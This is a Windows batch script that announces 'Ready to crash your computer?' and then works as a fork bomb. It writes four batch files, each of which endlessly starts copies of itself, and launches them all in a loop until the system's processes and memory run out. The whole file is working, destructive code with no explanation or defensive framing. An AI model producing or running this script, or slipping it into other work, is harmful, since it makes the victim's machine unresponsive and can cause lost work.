@echo off
echo Ready to crash your computer?
:loop
pause

echo :loop > file.bat && echo start file.bat >> file.bat && echo start file.bat >> file.bat &&echo start file.bat >> file.bat &&echo start file.bat >> file.bat && echo start file.bat >> file.bat &&echo start file.bat >> file.bat && echo goto loop >> file.bat
echo :loop > file2.bat && echo start file2.bat >> file2.bat && echo start file2.bat >> file2.bat &&echo start file2.bat >> file2.bat &&echo start file2.bat >> file2.bat && echo start file2.bat >> file2.bat &&echo start file2.bat >> file2.bat && echo goto loop >> file2.bat
echo :loop > file3.bat && echo start file3.bat >> file3.bat && echo start file3.bat >> file3.bat &&echo start file3.bat >> file3.bat &&echo start file3.bat >> file3.bat && echo start file3.bat >> file3.bat &&echo start file3.bat >> file3.bat && echo goto loop >> file3.bat
echo :loop > file4.bat && echo start file4.bat >> file4.bat && echo start file4.bat >> file4.bat &&echo start file4.bat >> file4.bat &&echo start file4.bat >> file4.bat && echo start file4.bat >> file4.bat &&echo start file4.bat >> file4.bat && echo goto loop >> file4.bat

start file.bat
start file2.bat
start file3.bat
start file4.bat

goto loop
